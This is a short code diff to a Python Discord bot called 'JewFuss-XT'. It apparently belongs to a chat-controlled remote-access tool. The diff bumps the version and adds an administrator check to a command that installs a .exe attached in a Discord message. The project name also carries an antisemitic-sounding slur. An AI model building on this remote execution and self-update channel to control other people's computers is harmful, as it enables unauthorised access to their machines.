@@ -45,7 +45,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.4.0" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.4.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 
 FUCK = hashlib.md5(uuid.uuid4().bytes).digest().hex()[:6]
 
@@ -67,6 +67,10 @@ async def fm_send(ctx, content: str, alt_content: str = None, filename: str = "o
 
 @bot.command(help="Updates JewFuss using the attached .exe file. (Must be a compiled installer, not a direct JewFuss executable)")
 async def update(ctx):
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("You don't have permission to access this command.")
+        return
+    
     if not ctx.message.attachments:
         await ctx.send("No file attached. Please attach a `.exe` file.", empherial=True)
         return
